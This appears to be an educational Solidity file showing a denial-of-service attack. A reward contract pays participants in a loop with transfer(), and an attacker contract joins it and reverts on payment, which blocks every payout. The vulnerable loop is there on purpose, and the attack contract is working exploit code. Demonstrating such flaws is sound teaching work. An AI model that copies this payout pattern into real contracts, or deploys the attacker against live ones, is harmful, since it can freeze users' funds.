//SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.8.25;

contract RewardDistribution{
    address public owner;
    address[] public participates;

    constructor()payable {
        owner = msg.sender;
    }
    modifier onlyowner{
        require(msg.sender == owner,"Access is denied!");
        _;
    }
    // Allows a user to participate by sending exactly 1 ether
    function participate()public payable {
        if(msg.value == 1 ether){
            participates.push(msg.sender);
        }
    }
    // Distributes rewards to all participants, only callable by the owner
    function distributeRewards()public onlyowner{
        for(uint256 i=0;i<participates.length;i++){
            payable (participates[i]).transfer(1.001 ether);
        }
    }
    // Fallback function to receive Ether
    receive() external payable { }
}
contract DOSAttack{
    
    RewardDistribution victim;
    // Initialize the DOSAttack contract with the address of the RewardDistribution contract
    constructor(RewardDistribution _victim){
        victim = RewardDistribution(_victim);
    }
    // Fallback function to reject Ether and revert the transaction
    receive() external payable { 
        revert("No Ether Accepted! ha ha ha :))))");
    }
    // Function to participate in the RewardDistribution contract by sending Ether
    function attack()public payable {
        victim.participate{value: msg.value}();
    }
}
// The DOSAttack contract can become a member of participants with the attack function at first.

// When the owner of RewardDistribution calls the distributeRewards function,
// the attack contract does not accept Ether, causing the service to be stopped due to the revert statement.

